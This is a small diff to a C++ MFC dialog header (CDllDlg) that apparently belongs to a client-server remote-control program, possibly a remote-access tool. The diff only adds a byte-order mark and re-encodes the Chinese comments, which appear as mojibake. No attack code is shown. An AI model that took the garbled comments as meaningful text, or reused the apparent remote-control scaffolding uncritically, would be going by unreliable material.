@@ -1,4 +1,4 @@
-#if !defined(AFX_DLLDLG_H__1316DFC2_83E7_4AF9_91E7_B021AAEE5BA6__INCLUDED_)
+ï»¿#if !defined(AFX_DLLDLG_H__1316DFC2_83E7_4AF9_91E7_B021AAEE5BA6__INCLUDED_)
 #define AFX_DLLDLG_H__1316DFC2_83E7_4AF9_91E7_B021AAEE5BA6__INCLUDED_
 
 #if _MSC_VER > 1000
@@ -17,9 +17,9 @@ public:
 	CDllDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
 	void OnReceiveComplete();
 	//void SendSelectCommand(PBYTE pData, UINT nSize);
-	CString m_strOperatingFile; // ÎÄ¼şÃû
-	__int64 m_nOperatingFileLength; // ÎÄ¼ş×Ü´óĞ¡
-	__int64	m_nCounter;// ¼ÆÊıÆ÷
+	CString m_strOperatingFile; // æ–‡ä»¶å
+	__int64 m_nOperatingFileLength; // æ–‡ä»¶æ€»å¤§å°
+	__int64	m_nCounter;// è®¡æ•°å™¨
 	bool m_bIsStop;
 	CString m_strOperatingPath;
 	CListCtrl* m_pListCtrl;
